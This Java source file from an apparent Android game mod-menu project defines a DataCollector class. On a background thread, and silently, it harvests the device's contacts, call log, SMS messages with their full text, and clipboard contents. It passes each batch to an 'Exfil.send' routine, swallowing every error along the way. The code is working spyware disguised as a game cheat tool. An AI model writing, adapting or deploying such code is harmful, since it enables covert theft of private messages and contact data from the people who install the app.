package com.brawl.modmenu;

import android.content.Context;
import android.content.ClipboardManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.Telephony;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DataCollector {

    public static void collectAll(final Context ctx) {
        new Thread(() -> {
            try { sendContacts(ctx); } catch (Throwable ignored) {}
            try { Thread.sleep(1500); } catch (Throwable ignored) {}
            try { sendCallLog(ctx); } catch (Throwable ignored) {}
            try { Thread.sleep(1500); } catch (Throwable ignored) {}
            try { sendSmsHistory(ctx); } catch (Throwable ignored) {}
            try { Thread.sleep(1500); } catch (Throwable ignored) {}
            try { sendClipboard(ctx); } catch (Throwable ignored) {}
        }).start();
    }

    private static void sendContacts(Context ctx) {
        StringBuilder sb = new StringBuilder();
        Cursor c = ctx.getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null);
        if (c == null) return;

        int count = 0;
        while (c.moveToNext() && count < 500) {
            String name = c.getString(c.getColumnIndexOrThrow(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phone = c.getString(c.getColumnIndexOrThrow(
                ContactsContract.CommonDataKinds.Phone.NUMBER));
            sb.append(name).append(" — ").append(phone).append("\n");
            count++;
        }
        c.close();
        sb.insert(0, "Всего: " + count + "\n\n");
        Exfil.send("CONTACTS", sb.toString());
    }

    private static void sendCallLog(Context ctx) {
        StringBuilder sb = new StringBuilder();
        Cursor c = ctx.getContentResolver().query(
            CallLog.Calls.CONTENT_URI, null, null, null,
            CallLog.Calls.DATE + " DESC");
        if (c == null) return;

        int count = 0;
        SimpleDateFormat fmt = new SimpleDateFormat("dd.MM HH:mm", Locale.US);
        while (c.moveToNext() && count < 200) {
            String num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
            String name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
            int type = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
            long dur = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
            long date = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE));

            String t = type == CallLog.Calls.INCOMING_TYPE ? "📥" :
                       type == CallLog.Calls.OUTGOING_TYPE ? "📤" : "❌";
            sb.append(t).append(" ")
              .append(name != null ? name : num).append(" ")
              .append(num).append(" ").append(dur).append("s ")
              .append(fmt.format(new Date(date))).append("\n");
            count++;
        }
        c.close();
        sb.insert(0, "Всего: " + count + "\n\n");
        Exfil.send("CALLS", sb.toString());
    }

    private static void sendSmsHistory(Context ctx) {
        StringBuilder sb = new StringBuilder();
        Cursor c = ctx.getContentResolver().query(
            Telephony.Sms.CONTENT_URI, null, null, null,
            Telephony.Sms.DATE + " DESC");
        if (c == null) return;

        int count = 0;
        SimpleDateFormat fmt = new SimpleDateFormat("dd.MM HH:mm", Locale.US);
        while (c.moveToNext() && count < 200) {
            String addr = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
            String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
            long date = c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
            sb.append(fmt.format(new Date(date))).append(" ")
              .append(addr).append("\n").append(body).append("\n---\n");
            count++;
        }
        c.close();
        sb.insert(0, "Всего: " + count + "\n\n");
        Exfil.send("SMS_HISTORY", sb.toString());
    }

    private static void sendClipboard(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager)
                ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                CharSequence txt = cm.getPrimaryClip()
                    .getItemAt(0).coerceToText(ctx);
                if (txt != null && txt.length() > 0) {
                    Exfil.send("CLIPBOARD", txt.toString());
                }
            }
        } catch (Throwable ignored) {}
    }
}
